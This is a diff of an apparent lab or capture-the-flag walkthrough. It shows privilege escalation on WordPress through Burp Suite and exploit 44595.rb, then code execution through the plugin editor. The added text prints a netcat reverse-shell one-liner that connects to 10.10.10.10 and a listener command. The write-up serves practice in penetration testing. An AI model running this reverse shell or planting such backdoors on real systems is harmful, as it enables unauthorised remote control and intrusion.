@@ -67,22 +67,32 @@ I use a command to download that file to my computer
 <h5>searchsploit -m 44595.rb</h5>
 
 <h1>4. Initial Access</h1>
-<h2>After completing the other parts, I will use Burp Suite to attack the vendor for this part.</h2>
+<h2>After completing the preceding tasks, I will use Burp Suite to assess the application’s access controls and permission model.</h2>
 
-First, go to Burp Suite to enable intercept in the proxy section.
+<h3>First, go to Burp Suite to enable intercept in the proxy section.</h3>
 <img width="1399" height="434" alt="image" src="https://github.com/user-attachments/assets/67363202-95ee-4a97-a2c7-52217e743e82" />
 
-At that time, I logged into WordPress with the username and password I had previously obtained, went to the profile section, and clicked update.
+<h3>At that time, I logged into WordPress with the username and password I had previously obtained, went to the profile section, and clicked update.</h3>
 <img width="844" height="701" alt="image" src="https://github.com/user-attachments/assets/c930fd6e-6ae7-4ed3-8932-769493210734" />
 ===============
 <img width="611" height="486" alt="image" src="https://github.com/user-attachments/assets/220b6db3-da28-4754-a74d-fb7ce21485e6" />
 ===============
 <img width="931" height="490" alt="image" src="https://github.com/user-attachments/assets/0c1bbe19-c514-4e49-9f59-5fe6fe1fe9c3" />
 
-When you press update, you will go into Burp Suite, filter out the link for the update part, and proceed to forward from the vulnerability in the file 44595.rb.
+<h3>When you press update, you will go into Burp Suite, filter out the link for the update part, and proceed to forward from the vulnerability in the file 44595.rb.</h3>
 <img width="1606" height="306" alt="image" src="https://github.com/user-attachments/assets/5d610188-18d2-42d1-abcd-bc8379e873f5" />
 ===============
+<img width="1617" height="484" alt="image" src="https://github.com/user-attachments/assets/f039b8a6-007d-46db-bbd6-bbcd98e536f0" />
+Then click ‘Forward.’
+====>You currently have administrator privileges.
 
-
-
+<h3>Then, in the WordPress dashboard, you have partial administrator privileges. Go to Plugins → Editor.</h3>
+<img width="828" height="379" alt="image" src="https://github.com/user-attachments/assets/7deb632e-13d5-41ca-a9e0-ddb56579897d" />
+===============
+<h3>Go to the reverse-shell page and get an appropriate reverse-shell backdoor to insert into the PHP code.</h3>
+<img width="1138" height="277" alt="image" src="https://github.com/user-attachments/assets/4cf4443e-e6f6-43ee-9e9d-6b7471e99119" />
+<h5>Code reverse shell:rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f </h5>
+<h3>Please confirm using the Update button below, then open a terminal and run a listener on the port you intend to use for the backdoor.</h3>
+<img width="887" height="299" alt="image" src="https://github.com/user-attachments/assets/9ab431cb-5c24-4ef1-9417-5da62a348955" />
+<h5>Code listen: nc -lvnp "PORT"</h5>
 
